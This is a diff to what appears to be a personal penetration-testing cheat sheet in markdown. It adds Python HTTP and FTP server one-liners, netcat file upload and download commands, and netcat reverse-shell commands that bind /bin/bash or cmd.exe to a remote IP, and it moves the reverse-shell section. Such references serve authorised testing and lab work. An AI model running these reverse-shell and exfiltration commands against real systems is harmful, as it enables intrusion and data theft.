@@ -2,7 +2,11 @@
 
 ## Common Commands
 
-<code>python -m SimpleHTTPServer [PORT]</code>
+### Python 
+
+Python HTTP Server: <code>python -m SimpleHTTPServer [PORT]</code>
+
+Python FTP Server: <code>python -m pyftpdlib -p 21</code>
 
 ### Netcat Listener
 
@@ -10,9 +14,21 @@ Linux: <code>nc -lnvp [PORT]</code>
 
 Windows: <code>nc.exe -lnvcp [PORT]</code>
 
+### Upload / Download files with Netcat
+
+Download: <code>nc -lnvp [PORT] > [OUT_FILE]</code>
+
+Upload: <code>nc -nv [IP] [PORT] < [IN_FILE]</code>
+
 ## Reverse Shells
 
 [Reverse Shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell)
+
+### Netcat
+
+Linux: <code>nc -nv [IP] [PORT] -e /bin/bash</code>
+
+Windows: <code>nc.exe -nv [IP] [PORT] -e cmd.exe</code>
 
 ### Upgrading Reverse Shells
 
@@ -29,12 +45,6 @@ Background the shell with <code>Ctrl+Z</code>
 Foreground the shell with <code>fg</code> 
 
 Hit Return 2x
-
-### Netcat
-
-Linux: <code>nc -nv [IP] [PORT] -e /bin/bash</code>
-
-Windows: <code>nc.exe -nv [IP] [PORT] -e cmd.exe</code>
 
 ## NMAP
 
